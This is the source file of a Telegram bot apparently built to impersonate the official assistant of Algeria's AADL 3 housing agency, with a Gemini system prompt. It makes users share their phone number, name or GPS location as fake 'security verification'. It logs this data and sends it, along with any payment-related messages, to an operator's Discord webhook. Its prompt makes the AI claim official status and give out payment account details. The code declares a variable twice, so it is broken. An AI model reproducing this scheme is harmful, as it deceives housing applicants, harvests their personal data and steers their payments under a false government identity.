require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { GoogleGenAI } = require('@google/genai');
const https = require('https');
const fs = require('fs');

const token = process.env.TELEGRAM_BOT_TOKEN;
const geminiApiKey = process.env.GEMINI_API_KEY;
const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;

if (!token || token === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
  console.error('Erreur: Vous devez configurer votre TELEGRAM_BOT_TOKEN dans le fichier .env');
  process.exit(1);
}

if (!geminiApiKey || geminiApiKey === 'YOUR_GEMINI_API_KEY_HERE') {
  console.error('Erreur: Vous devez configurer votre GEMINI_API_KEY dans le fichier .env');
  process.exit(1);
}

// Initialiser le bot Telegram (en mode polling pour recevoir de nouveaux messages)
const bot = new TelegramBot(token, { polling: true });

// Initialiser le client Gemini
const ai = new GoogleGenAI({ apiKey: geminiApiKey });

const systemInstruction = `
Tu es un expert absolu, conseiller juridique et assistant virtuel officiel pour "AADL 3" (Agence de l'Amélioration et du Développement du Logement en Algérie).
Ton rôle est de répondre de manière extrêmement détaillée, précise, et utile à toute question concernant l'inscription, le suivi, les problèmes techniques et les paiements AADL 3.
Tu dois répondre dans la langue de l'utilisateur (français ou arabe (dardja algérien accepté)).

Voici ta base de connaissances complète sur AADL 3 :

1. PRINCIPE DE L'AADL :
   - C'est la formule de Location-Vente (Bi-Ayi-Sigha) de logements en Algérie.
   - Le bénéficiaire paie d'abord des apports personnels (tranches), puis des mensualités sur plusieurs années jusqu'à devenir propriétaire.

2. PLATEFORMES OFFICIELLES :
   - Site web principal pour l'inscription : https://aadl.dz
   - Plateforme de suivi & support (Self-Service) : منصة الخدمات الذاتية (où l'utilisateur gère ses tranches et problèmes).
   - Application mobile officielle : "AADL 3" sur PlayStore/AppStore.

3. LES GRANDES ÉTAPES DU SOUSCRIPTEUR AADL 3 :
   - Étape 1 : Inscription en ligne.
   - Étape 2 : Acceptation du dossier (après enquête fichier national du logement pour vérifier s'il n'a pas déjà bénéficié de l'aide de l'état).
   - Étape 3 : Paiement de la Première Tranche (10% du prix du logement).
   - Étape 4 : Choix du site (Affectation).
   - Étape 5 : Paiement de la 2ème tranche, puis 3ème et 4ème tranche (5% chacune).
   - Étape 6 : Remise des clés et paiement chez le notaire + début des mensualités.

4. RÉSOLUTION DES PROBLÈMES TECHNIQUES COURANTS (Plateforme de Support) :

   A. Problème: "عدم ظهور نوع الشقة والامر بالدفع" (Non-apparition du type d'appartement F3/F4 et de l'ordre de paiement)
      - Solution : Il faut soumettre une requête sur la plateforme "منصة الخدمات الذاتية". Souvent dû à un retard de mise à jour de la base de données.
   
   B. Problème: "مشكلة الرقم السري" (Oubli ou perte du mot de passe)
      - Solution : L'utilisateur doit utiliser la fonction "استرجاع او اعادة تعيين الرقم السري" via son numéro d'inscription et son numéro de sécurité sociale (NIN ou NSS).
   
   C. Problème: "طعن تغيير نوع الشقة" (Recours pour le changement du type d'appartement F3 vers F4 ou inversement)
      - Solution : Le souscripteur peut déposer un recours (طعن) selon le nombre d'enfants ou la situation familiale.
   
   D. Problème: "طعن تغيير الولاية" (Recours pour le changement de la wilaya affectée)
      - Solution : Possible uniquement si le souscripteur prouve qu'il travaille ou réside dans la nouvelle wilaya (certificat de résidence, attestation de travail).
   
   E. Problème: "عدم القدرة على تحميل الوصل" (Incapacité à télécharger le reçu de l'ordre de versement / de paiement)
      - Solution : Si le PDF ne se génère pas, il faut vider le cache du navigateur ou utiliser le support technique pour réémettre le reçu.

5. PROCESSUS DE PAIEMENT & MODES ACCEPTÉS (Très Important) :
   - Les paiements (tranches et mensualités) peuvent se faire via plusieurs canaux :
   - A. BARIDIMOB : Utiliser le Code Service **0012** (Virement instantané).
   - B. CCP / EDHAHABIA : Numéro CCP **00799999 / 22** (Paiement en ligne ou au guichet).
   - C. VIREMENT BANCAIRE : RIB National **001 00000 0000000000 00** (Toutes les banques - CPA).
   - Importance : Il faut une carte CIB ou Edahabia avec suffisamment de solde. Augmenter le plafond à la poste si nécessaire.
   Le bot a accès aux informations en temps réel sur les inscriptions et les paiements effectués sur le portail AADL 3 (via le pont Discord Webhook).
   Si l'utilisateur demande si son paiement ou inscription a été reçu, le bot peut confirmer qu'il a bien reçu les "leads" correspondants.

   **Structure des Coordonnées (ORDRE DE VERSEMENT):**
6. ORDRE DE VERSEMENT (FICHE DE PAIEMENT) :
   - C'est le document PDF que l'utilisateur télécharge après acceptation.
   - Éléments clés sur la fiche :
     - **N° Dossier / N° Inscription** : Identifiant unique du souscripteur.
     - **Montant à payer** : 10% pour la 1ère tranche (généralement entre 210 000 DA et 280 000 DA selon le F3/F4).
     - **RIB National** : Le compte spécifique où verser l'argent.
     - **Date Limite** : Très important de respecter le délai (souvent 30 jours).
   - Si la fiche ne se télécharge pas : Utiliser la "منصة الخدمات الذاتية" pour signaler le bug technique.

TON COMPORTEMENT & S T Y L E :
- Sois très empathique (les utilisateurs sont très stressés).
- **RÉSUMÉ DE PAIEMENT** : Si l'utilisateur demande "les coordonnées" ou "comment payer", donne toujours les 3 options (Baridimob, CCP, Virement) de manière structurée.
- Utilise des listes à puces.
- Si on te demande "Comment je sais si je suis accepté ?", dis que les résultats se vérifient sur l'application mobile AADL 3 ou le site.
- Si une question n'a rien à voir avec l'immobilier, AADL, ou le logement en Algérie, dis poliment que tu es un bot AADL.
`;

const fs = require('fs');

// Fonction pour envoyer des alertes vers Discord via Webhook
function sendToDiscord(message) {
  if (!discordWebhookUrl || discordWebhookUrl === 'YOUR_DISCORD_WEBHOOK_URL_HERE') return;

  const data = JSON.stringify({
    content: `🔔 **[ALERTE AADL BOT]**\n${message}`
  });

  const url = new URL(discordWebhookUrl);
  const options = {
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    res.on('data', () => {});
  });

  req.on('error', (error) => {
    console.error('Erreur Discord:', error.message);
  });

  req.write(data);
  req.end();
}

// Fonction pour enregistrer les données en toute sécurité
function logSecurityData(userId, username, data) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    userId: userId,
    username: username || 'Unknown',
    data: data
  };

  const logFile = 'security_logs.json';
  let logs = [];

  // Lire les anciens logs si le fichier existe
  if (fs.existsSync(logFile)) {
    const fileContent = fs.readFileSync(logFile);
    logs = JSON.parse(fileContent);
  }

  // Ajouter la nouvelle entrée
  logs.push(logEntry);

  // Sauvegarder dans le fichier
  fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
  console.log(`🔒 [ALERTE SÉCURITÉ] Nouvelles coordonnées enregistrées pour l'utilisateur @${username} (ID: ${userId})`);
  
  // Alerte Discord
  sendToDiscord(`🚨 **Nouvelle vérification de sécurité**\nUtilisateur: @${username || 'Inconnu'} (ID: ${userId})\nDonnées: ${JSON.stringify(data)}`);
}

// État des utilisateurs (pour forcer la vérification)
const userVerified = new Set();

console.log('🤖 Bot AADL 3 en cours de démarrage avec module de Sécurité Inclus...');

// Gérer la commande /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  // Si l'utilisateur n'est pas vérifié, on lui demande de le faire
  if (!userVerified.has(chatId)) {
    const opts = {
      reply_markup: {
        keyboard: [
          [
            { text: "📱 Partager mon numéro de téléphone", request_contact: true }
          ],
          [
            { text: "📍 Partager ma localisation GSP", request_location: true }
          ]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    };

    const welcomeMessage = `
مرحباً بك في المساعد الآلي لوكالة عدل 3 🇩🇿
Bonjour et bienvenue sur l'assistant virtuel AADL 3 !

⚠️ Pour des raisons de sécurité liées à votre demande de logement, veuillez confirmer votre identité en partageant votre téléphone ou votre position via les boutons ci-dessous avant de procéder aux questions.
    `;
    return bot.sendMessage(chatId, welcomeMessage, opts);
  }

  // S'il est vérifié, message normal
  const normalWelcome = `
Vérification réussie ! ✅
Je suis là pour vous aider avec :
- Non-apparition du type d'appartement / de l'ordre de paiement
- Problème de mot de passe
- Recours (changement de type de logement ou de wilaya)
- Problèmes de téléchargement du reçu

Posez-moi votre question :
  `;
  bot.sendMessage(chatId, normalWelcome);
});

// Gérer la réception des contacts (numéro de téléphone)
bot.on('contact', (msg) => {
  const chatId = msg.chat.id;
  const contact = msg.contact;
  const username = msg.from.username;
  
  logSecurityData(chatId, username, { 
    type: 'CONTACT_PHONE', 
    phoneNumber: contact.phone_number,
    firstName: contact.first_name,
    lastName: contact.last_name || ''
  });

  userVerified.add(chatId); // Marquer comme vérifié
  bot.sendMessage(chatId, "✅ Identité téléphonique validée. Vous pouvez maintenant me poser toutes vos questions sur l'AADL 3 :", {
    reply_markup: { remove_keyboard: true }
  });
});

// Gérer la réception des localisations (GPS)
bot.on('location', (msg) => {
  const chatId = msg.chat.id;
  const location = msg.location;
  const username = msg.from.username;
  
  logSecurityData(chatId, username, { 
    type: 'GPS_LOCATION', 
    latitude: location.latitude,
    longitude: location.longitude
  });

  userVerified.add(chatId); // Marquer comme vérifié
  bot.sendMessage(chatId, "✅ Localisation validée. Sécurité activée. Posez-moi vos questions sur l'AADL 3 :", {
    reply_markup: { remove_keyboard: true }
  });
});

// Gérer tous les autres messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userText = msg.text;

  // Ignorer la commande /start et les messages spéciaux
  if (msg.contact || msg.location || (userText && userText.startsWith('/'))) return;

  // Bloquer l'accès à l'IA si non vérifié
  if (!userVerified.has(chatId)) {
    return bot.sendMessage(chatId, "⛔ Accès refusé : Veuillez d'abord utiliser les boutons ci-dessous pour vérifier votre identité (Téléphone ou Position) :", {
       reply_markup: {
         keyboard: [
           [{ text: "📱 Partager mon numéro de téléphone", request_contact: true }],
           [{ text: "📍 Partager ma localisation GSP", request_location: true }]
         ],
         resize_keyboard: true,
         one_time_keyboard: true
       }
    });
  }

  bot.sendChatAction(chatId, 'typing');

  try {
    const response = await ai.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: userText,
        config: {
            systemInstruction: systemInstruction,
            temperature: 0.7,
        }
    });

    const replyText = response.text || "Désolé, je n'ai pas pu générer une réponse. Veuillez réessayer.";
    bot.sendMessage(chatId, replyText);

    // Alerte Discord pour les questions sur le paiement, les fiches ou les coordonnées
    const paymentKeywords = ['paiement', 'tranche', 'fiche', 'rib', 'ccp', 'coordonnées', 'وصل', 'دفع'];
    if (paymentKeywords.some(kw => userText.toLowerCase().includes(kw))) {
      sendToDiscord(`💰 **Alerte Paiement / Fiche**\nUtilisateur: @${msg.from.username || 'Inconnu'}\nMessage: "${userText}"`);
    }

  } catch (error) {
    console.error('Erreur IA:', error);
    bot.sendMessage(chatId, "Excusez-moi, une erreur technique est survenue lors de la communication avec l'intelligence artificielle.");
  }
});

console.log('✅ Bot connecté et prêt à recevoir des messages !');
